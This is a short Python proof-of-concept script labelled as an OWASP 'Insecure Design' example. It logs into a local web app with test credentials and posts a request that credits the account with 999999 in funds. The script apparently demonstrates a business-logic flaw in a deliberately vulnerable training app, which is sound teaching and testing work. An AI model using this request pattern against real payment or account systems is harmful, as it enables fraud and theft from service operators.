#OWASP A04:2021 - Insecure Design

import requests

s = requests.Session()
s.post("http://localhost:5000/login", data={"username": "teste", "password": "teste"})
s.post("http://localhost:5000/add_funds", data={"amount": "999999"})
